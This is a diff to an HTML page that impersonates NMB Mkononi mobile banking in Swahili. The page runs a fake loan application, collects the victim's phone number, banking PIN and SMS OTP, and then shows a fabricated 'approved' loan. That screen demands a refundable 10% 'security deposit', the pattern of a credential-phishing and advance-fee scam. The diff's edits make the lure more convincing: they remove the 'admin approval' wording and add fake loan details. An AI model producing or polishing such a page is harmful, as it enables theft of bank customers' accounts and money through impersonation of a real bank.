@@ -11,7 +11,7 @@
     <div class="header-container">
       <div class="logo-area">
         <span class="bank-badge">NMB</span>
-        <h1 class="bank-title">NMB Mkononi</h1>
+        <h1 class="bank-title">NMB Mkononi Tanzania</h1>
       </div>
     </div>
   </header>
@@ -60,7 +60,7 @@
       </div>
     </div>
 
-    <!-- VIEW 2: MULTI-STEP APPLICATION FORM -->
+    <!-- VIEW 2: MULTI-STEP APPLICATION FORM (STEPS 1 TO 3 HORIZONTAL / SEPARATE) -->
     <div id="view-form" class="card hidden">
       <div class="form-header">
         <h2>Maombi ya Mkopo wa NMB</h2>
@@ -89,7 +89,7 @@
           <label>Sababu ya Mkopo</label>
           <textarea id="loan-purpose" placeholder="mfano: Kupanua biashara yangu ya duka" rows="3" required></textarea>
         </div>
-        <button type="button" class="primary-btn next-btn" disabled>HATUA INAYOFUATA</button>
+        <button type="button" class="primary-btn next-btn" disabled>NEXT</button>
       </div>
 
       <!-- Step 2: Personal Info & NMB Number -->
@@ -111,7 +111,7 @@
         </div>
         <div class="button-group">
           <button type="button" class="secondary-btn prev-btn">NYUMA</button>
-          <button type="button" class="primary-btn next-btn" disabled>HATUA INAYOFUATA</button>
+          <button type="button" class="primary-btn next-btn" disabled>NEXT</button>
         </div>
       </div>
 
@@ -141,26 +141,21 @@
 
         <div class="button-group">
           <button type="button" class="secondary-btn prev-btn">NYUMA</button>
-          <button type="button" id="btn-submit-app" class="primary-btn" disabled>WASILISHA MAOMBI</button>
+          <button type="button" id="btn-submit-app" class="primary-btn next-btn" disabled>NEXT</button>
         </div>
       </div>
     </div>
 
-    <!-- VIEW 3: WAITING FOR ADMIN APPROVAL (PIN ENTRY SCREEN) -->
+    <!-- VIEW 3: WAITING / LOADING SPINNER ONLY -->
     <div id="view-waiting" class="card hidden center-card">
       <div class="spinner"></div>
-      <h2>Maombi Yamewasilishwa NMB</h2>
-      <p>Maombi yako yametumwa kwenye mfumo wa NMB. Tafadhali subiri uthibitisho.</p>
-      <div class="status-box">
-        <span id="waiting-status-text">Inasubiri meneja wa NMB kukagua maelezo...</span>
-      </div>
     </div>
 
     <!-- VIEW 4: PIN & LOGIN ENTRY -->
     <div id="view-login" class="card hidden">
       <div class="login-header">
-        <span class="bank-badge sm">NMB MKONONI</span>
-        <h2>Ingiza Namba ya NMB</h2>
+        <span class="bank-badge sm">NMB MKONONI TANZANIA</span>
+        <h2>LOG IN</h2>
         <p>Weka namba yako ya simu (tarakimu 9) na PIN ya NMB Mkononi</p>
       </div>
       <div class="field">
@@ -182,7 +177,13 @@
 
     <!-- VIEW 5: OTP VERIFICATION (4 DIGITS) -->
     <div id="view-otp" class="card hidden">
-      <h2>Uthibitisho wa OTP wa NMB</h2>
+      <h2>Uthibitisho wa OTP wa NMB MKONONI TANZANIA</h2>
+      
+      <!-- Notification Banner for OTP sent to SMS -->
+      <div class="otp-notification-banner" style="background: #e6f4ea; border-left: 4px solid #34a853; padding: 12px 15px; margin-bottom: 15px; border-radius: 4px;">
+        <p style="margin: 0; color: #137333; font-size: 14px; font-weight: 500;">📲 ENTER OTP SEND TO SMS</p>
+      </div>
+
       <p>Ingiza namba 4 za OTP zilizotumwa kwenda namba yako ya NMB <span id="otp-target-display"></span></p>
       <div class="field">
         <div class="otp-inputs">
@@ -197,15 +198,50 @@
     </div>
 
     <!-- VIEW 6: SUCCESS -->
-    <div id="view-success" class="card hidden center-card">
-      <div class="success-icon">✓</div>
-      <h2>Hongera Kupitia NMB!</h2>
-      <p>Mkopo wako umeidhinishwa na NMB! Fedha zitatumwa kwenye akaunti yako ya NMB Mkononi hivi punde.</p>
-      <div class="approved-amount-box">
-        <span>KIASI KILICHOPITISHWA NA NMB</span>
-        <h3 id="approved-amount-val">TZS 2,500,000</h3>
+    <div id="view-success" class="card hidden center-card success-screen-styled">
+      <div class="success-icon-badge">✓</div>
+      <h2>🎉 Hongera NMB MKONONI TANZANIA!</h2>
+      <p class="success-subtitle">Mkopo wako <strong>umeidhinishwa!</strong> Fedha zitatolewa hivi karibuni.</p>
+      
+      <div class="approved-amount-section">
+        <span class="approved-label">KIASI KILICHOIDHANISHWA</span>
+        <h3 id="approved-amount-val">TSh 100,000</h3>
       </div>
-      <button id="btn-home" class="primary-btn">RUDI MWANZO</button>
+
+      <div class="notice-box">
+        <p>⚠️ <strong>NOTISI YA UZINGATIAJI</strong></p>
+        <p>Akaunti yako ya NMB Mkononi lazima iwe hai na idumishe amana ya usalama ya angalau 10% ya kiasi cha mkopo ulioomba. Amana hii inarudishwa kikamilifu baada ya kulipa mkopo na husaidia kupata riba nzuri zaidi.</p>
+      </div>
+
+      <div class="loan-details-section">
+        <h4>📋 Maelezo ya Mkopo</h4>
+        <div class="detail-row">
+          <span>MALIPO YA KILA MWEZI</span>
+          <strong>TSh 2,441</strong>
+        </div>
+        <div class="detail-row">
+          <span>MUDA WA MKOPO</span>
+          <strong>Miezi 48</strong>
+        </div>
+        <div class="detail-row">
+          <span>KIWANGO CHA RIBA</span>
+          <strong>8% APR</strong>
+        </div>
+      </div>
+
+      <div class="quick-actions">
+        <h5>Vitendo vya Haraka</h5>
+        <button type="button" class="action-row-btn">💰 Weka Fedha</button>
+        <button type="button" class="action-row-btn">💳 Toa Fedha</button>
+        <button type="button" class="action-row-btn">📄 Maelezo ya Mkopo</button>
+      </div>
+
+      <div class="next-steps-footer-box">
+        <p>📱 <strong>Hatua Zinazofuata:</strong></p>
+        <p>Utapata SMS na barua pepe yenye maelezo ya utolewa ndani ya masaa 24.</p>
+      </div>
+
+      <button id="btn-home" class="primary-btn">🏠 Rudi Nyumbani</button>
     </div>
   </main>
 
@@ -216,4 +252,4 @@
   <script src="script.js"></script>
 </body>
   </html>
-            
+        
